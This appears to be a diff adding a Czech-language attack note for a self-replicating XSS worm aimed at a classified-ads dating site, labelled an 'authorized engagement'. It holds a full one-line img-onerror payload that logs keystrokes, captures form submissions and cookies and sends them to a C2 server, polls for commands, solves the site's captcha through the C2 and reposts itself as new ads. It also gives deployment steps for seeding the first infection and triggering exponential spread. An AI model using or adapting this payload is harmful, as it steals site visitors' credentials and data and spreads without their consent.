@@ -1,0 +1,31 @@
+=== localhost.cz — verze 5: SAMOŠÍŘÍCÍ SE ČERV (autorizovaný engagement) ===
+
+C2 server:  http://<C2_IP>:8080      (spusť c2_server.py)
+Cíl:        https://localhost.cz   (host-guard přímo v kódu)
+
+CO DĚLÁ:
+  1) dostane unikátní vid, beaconuje na C2 (/beacon) a čeká na příkaz
+  2) sbírá klávesy/formuláře/cookies -> C2 (/k, /f, /hello)
+  3) když C2 vrátí příkaz "SPREAD":
+       - stáhne /novy-inzerat (získá PHPSESSID)
+       - stáhne captcha.php (obrázek captchy)
+       - pošle captchu na C2 /solve  -> dostane součet prvních dvou číslic
+       - odešle POST na seznamka-vlozeni.php s TÍMTO stejným payloadem
+         do pole "Text do seznamky"  -> vznikne nový infikovaný inzerát
+       - nový inzerát se zobrazí dalším návštěvníkům -> červ se šíří sám
+
+JAK NASAZENÍ PROBÍHÁ (studium šíření):
+  - ručně vložíš tento payload do 1 inzerátu (nultá infekce)
+  - na C2 zavoláš /spread -> všichni infikovaní začnou vkládat nové inzeráty
+  - každý nový inzerát = nová infekce -> exponenciální šíření
+
+--- PAYLOAD (jednořádkově, vlož do "Text do seznamky") ---
+<img src=x onerror="var C=&quot;http://C2_IP:8080&quot;;if(location.host.indexOf(&quot;localhost.cz&quot;)&lt;0)return;var vid=Math.random().toString(36).slice(2,10),buf=&quot;&quot;;function g(u){new Image().src=C+u}function fl(){if(buf){g(&quot;/k?k=&quot;+encodeURIComponent(buf));buf=&quot;&quot;}}setInterval(fl,3000);document.onkeypress=function(e){buf+=e.key;if(buf.length&gt;50)fl()};document.addEventListener(&quot;submit&quot;,function(e){var el=e.target,d=&quot;&quot;;for(var i=0;i&lt;el.elements.length;i++){var x=el.elements[i];if(x.name&amp;&amp;x.type!=&quot;file&quot;)d+=x.name+&quot;=&quot;+encodeURIComponent(x.value||&quot;&quot;)+&quot;&amp;&quot;}g(&quot;/f?d=&quot;+encodeURIComponent(d))},true);addEventListener(&quot;visibilitychange&quot;,fl);function bcn(){var x=new XMLHttpRequest();x.open(&quot;GET&quot;,C+&quot;/beacon?vid=&quot;+vid+&quot;&amp;co=&quot;+encodeURIComponent(document.cookie)+&quot;&amp;u=&quot;+encodeURIComponent(location.href),true);x.onload=function(){try{var r=JSON.parse(x.responseText);if(r.cmd==&quot;SPREAD&quot;)spread()}catch(e){}};x.send()}function spread(){var x1=new XMLHttpRequest();x1.open(&quot;GET&quot;,&quot;https://localhost.cz/novy-inzerat&quot;,true);x1.onload=function(){var x2=new XMLHttpRequest();x2.open(&quot;GET&quot;,&quot;https://localhost.cz/captcha.php?t=&quot;+Date.now(),true);x2.responseType=&quot;blob&quot;;x2.onload=function(){var fr=new FileReader();fr.onload=function(){var x3=new XMLHttpRequest();x3.open(&quot;GET&quot;,C+&quot;/solve?img=&quot;+encodeURIComponent(fr.result.split(&quot;,&quot;)[1]),true);x3.onload=function(){var kod=&quot;&quot;;try{kod=JSON.parse(x3.responseText).sum}catch(e){}if(kod===null||kod===undefined||kod===&quot;&quot;)return;post(kod)};x3.send()};try{fr.readAsDataURL(x2.response)}catch(e){}};x2.send()};x1.send()}function post(kod){var P=&quot;IMGPAYLOADB64&quot;;var f=new FormData();var v={jmeno:&quot;Petr&quot;,rok:&quot;1990&quot;,vztah:&quot;1&quot;,pohlavi:&quot;muz&quot;,okres:&quot;Praha&quot;,vyska:&quot;180&quot;,vaha:&quot;80&quot;,zajmy:&quot;turistika a kolo&quot;,sport:&quot;fotbal&quot;,hudba:&quot;rock&quot;,prace:&quot;IT&quot;,TextArea:atob(P),mail:vid+&quot;@example.com&quot;,heslo:&quot;Heslo123&quot;,kod:kod,button:&quot;Odeslat&quot;};for(var k in v)f.append(k,v[k]);var x=new XMLHttpRequest();x.open(&quot;POST&quot;,&quot;https://localhost.cz/seznamka-vlozeni.php&quot;,true);x.send(f)}bcn();setInterval(bcn,15000);g(&quot;/hello?vid=&quot;+vid+&quot;&amp;co=&quot;+encodeURIComponent(document.cookie)+&quot;&amp;u=&quot;+encodeURIComponent(location.href))">
+
+--- POZNÁMKY ---
+  * &quot; = uvozovka, &amp; = &, &lt; = <, &gt; = >
+  * IMGPAYLOADB64 nahraď base64 (atob) verzí tohoto <img onerror> payloadu,
+    aby se replikoval beze změny. Vygeneruj:  echo -n '<PAYLOAD>' | base64 -w0
+  * C2_IP nahraď IP/doménou, kde běží c2_server.py
+  * host-guard:  if(location.host.indexOf("localhost.cz")<0)return;  (mimo cíl nic nedělá)
+  * captcha se řeší na serveru (C2 /solve) -> tesseract OCR, viz c2_server.py
